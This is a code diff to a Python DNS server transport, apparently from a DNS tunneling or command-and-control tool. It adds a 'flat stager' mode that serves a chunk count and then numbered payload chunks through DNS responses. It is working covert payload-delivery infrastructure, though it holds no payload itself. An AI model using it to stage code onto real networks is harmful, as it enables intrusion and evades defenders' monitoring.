@@ -15,7 +15,7 @@ import struct
 from ..transport_base import Server, TransportError, raise_bind_error
 from ..mtu_limits import resolve_mtu_limits
 from . import dns_codec as codec
-from ...config import Config
+from ...config import Config, DNS_STANDARD_SIZE
 from ...logging_util import get_logger, log_event
 from ...protocol.constants import MIN_PACKET_MTU
 from ...utils import parse_host_port
@@ -79,6 +79,28 @@ class DnsServer(Server):
         self._response_ttl = int(config.dns_response_ttl)
         if self._response_ttl < 0:
             raise ValueError('dns_response_ttl must be >= 0')
+        self._flat_chunks = config.dns_flat_chunks
+        self._flat_count = config.dns_flat_count
+        if self._flat_chunks:
+            if self._flat_count is None:
+                self._flat_count = len(self._flat_chunks)
+            if self._flat_count > len(self._flat_chunks):
+                self._flat_count = len(self._flat_chunks)
+        else:
+            self._flat_count = 0
+        self._flat_meta = config.dns_flat_meta
+        self._flat_chunk_size = config.dns_flat_chunk_size
+        self._flat_enabled = bool(self._flat_chunks and self._flat_count)
+        if self._flat_enabled and not self._flat_meta:
+            self._flat_meta = struct.pack('>2sBI', b'SF', 1, self._flat_count)
+        if self._flat_enabled:
+            self._flat_count_name = 'flat0.count.%s' % self._base_domain
+            self._flat_piece_prefix = 'flat0.'
+            self._flat_piece_suffix = '.%s' % self._base_domain
+        else:
+            self._flat_count_name = None
+            self._flat_piece_prefix = None
+            self._flat_piece_suffix = None
 
         # Parse listen address
         listen_addr = config.dns_listen_addr
@@ -285,6 +307,11 @@ class DnsServer(Server):
                                           reason='qtype_mismatch')
                 continue
 
+            if self._flat_enabled:
+                if self._handle_flat_query(
+                        query_id, qname, qname_lower, qtype, client_addr):
+                    continue
+
             if (qname_lower == self._cname_suffix_lower or
                     qname_lower.endswith('.' + self._cname_suffix_lower)):
                 self._send_cname_followup(query_id, qname, qtype, client_addr)
@@ -326,6 +353,86 @@ class DnsServer(Server):
             )
             return data, responder
 
+    def _handle_flat_query(self, query_id, qname, qname_lower, qtype, addr):
+        name = qname_lower.rstrip('.')
+        if name == self._flat_count_name:
+            if not self._flat_meta:
+                self._send_empty_response(
+                    query_id, qname, qtype, addr,
+                    reason='flat_missing',
+                    include_opt=False,
+                )
+                log_event(
+                    self._logger,
+                    logging.DEBUG,
+                    'dns.flat_invalid',
+                    'DNS flat stager count missing',
+                    lambda: {'dns_id': query_id},
+                )
+                return True
+            self._send_stager_response(query_id, qname, qtype, self._flat_meta, addr)
+            log_event(
+                self._logger,
+                logging.DEBUG,
+                'dns.flat_count',
+                'DNS flat stager count sent',
+                lambda: {
+                    'dns_id': query_id,
+                    'count': self._flat_count,
+                    'bytes': len(self._flat_meta),
+                },
+            )
+            return True
+        if not name.startswith(self._flat_piece_prefix):
+            return False
+        if not name.endswith(self._flat_piece_suffix):
+            return False
+        index_text = name[len(self._flat_piece_prefix):-len(self._flat_piece_suffix)]
+        if len(index_text) != 5 or not index_text.isdigit():
+            self._send_empty_response(
+                query_id, qname, qtype, addr,
+                reason='flat_invalid',
+                include_opt=False,
+            )
+            log_event(
+                self._logger,
+                logging.DEBUG,
+                'dns.flat_invalid',
+                'DNS flat stager invalid index',
+                lambda: {'dns_id': query_id, 'index': index_text},
+            )
+            return True
+        index = int(index_text)
+        if index < 1 or index > self._flat_count:
+            self._send_empty_response(
+                query_id, qname, qtype, addr,
+                reason='flat_invalid',
+                include_opt=False,
+            )
+            log_event(
+                self._logger,
+                logging.DEBUG,
+                'dns.flat_invalid',
+                'DNS flat stager index out of range',
+                lambda: {'dns_id': query_id, 'index': index},
+            )
+            return True
+        payload = self._flat_chunks[index - 1]
+        self._send_stager_response(query_id, qname, qtype, payload, addr)
+        log_event(
+            self._logger,
+            logging.DEBUG,
+            'dns.flat_piece',
+            'DNS flat stager piece sent',
+            lambda: {
+                'dns_id': query_id,
+                'index': index,
+                'count': self._flat_count,
+                'bytes': len(payload),
+            },
+        )
+        return True
+
     def _parse_query(self, data):
         """
         Parse DNS query packet.
@@ -364,8 +471,11 @@ class DnsServer(Server):
         return query_id, qname, qtype
 
     def _send_response(self, query_id, qname, qtype, data, addr,
-                       response_payload_cap, qname_wire_len, max_packet_size):
+                       response_payload_cap, qname_wire_len, max_packet_size,
+                       include_opt=True):
         """Build and send DNS response."""
+        opt_record = self._opt_record if include_opt else b''
+        opt_arcount = self._opt_arcount if include_opt else 0
         # Header
         flags = codec.FLAG_QR | codec.FLAG_AA  # Response + Authoritative
         header = struct.pack('>HHHHHH',
@@ -374,7 +484,7 @@ class DnsServer(Server):
             1,  # QDCOUNT
             1,  # ANCOUNT
             0,  # NSCOUNT
-            self._opt_arcount
+            opt_arcount
         )
 
         # Question (echo back)
@@ -415,7 +525,7 @@ class DnsServer(Server):
         )
         answer += rdata
 
-        response = header + question + answer + self._opt_record
+        response = header + question + answer + opt_record
         response_len = len(response)
         oversize = False
         if max_packet_size is not None:
@@ -445,8 +555,40 @@ class DnsServer(Server):
             },
         )
 
-    def _send_empty_response(self, query_id, qname, qtype, addr, reason=None):
+    def _stager_response_payload_cap(self, qname):
+        if self._rtype != codec.QTYPE_CNAME:
+            return None, None, None
+        qname_wire_len = len(codec.encode_name(qname))
+        payload_cap, max_packet_size = codec.calc_cname_response_payload_cap(
+            qname_wire_len,
+            DNS_STANDARD_SIZE,
+            self._cname_suffix,
+            self._label_max_len,
+            0,
+        )
+        return payload_cap, qname_wire_len, max_packet_size
+
+    def _send_stager_response(self, query_id, qname, qtype, data, addr):
+        response_payload_cap, qname_wire_len, max_packet_size = (
+            self._stager_response_payload_cap(qname)
+        )
+        self._send_response(
+            query_id,
+            qname,
+            qtype,
+            data,
+            addr,
+            response_payload_cap=response_payload_cap,
+            qname_wire_len=qname_wire_len,
+            max_packet_size=max_packet_size,
+            include_opt=False,
+        )
+
+    def _send_empty_response(self, query_id, qname, qtype, addr, reason=None,
+                             include_opt=True):
         """Send NOERROR response with no answers (NODATA) and SOA in authority."""
+        opt_record = self._opt_record if include_opt else b''
+        opt_arcount = self._opt_arcount if include_opt else 0
         flags = codec.FLAG_QR | codec.FLAG_AA
         header = struct.pack('>HHHHHH',
             query_id,
@@ -454,14 +596,14 @@ class DnsServer(Server):
             1,  # QDCOUNT
             0,  # ANCOUNT
             1,  # NSCOUNT - SOA record for negative caching
-            self._opt_arcount
+            opt_arcount
         )
 
         question = codec.encode_name(qname)
         question += struct.pack('>HH', qtype, codec.QCLASS_IN)
 
         # SOA record in authority section with TTL=0 to prevent negative caching
-        response = header + question + self._soa_record + self._opt_record
+        response = header + question + self._soa_record + opt_record
 
         try:
             self._sock.sendto(response, addr)
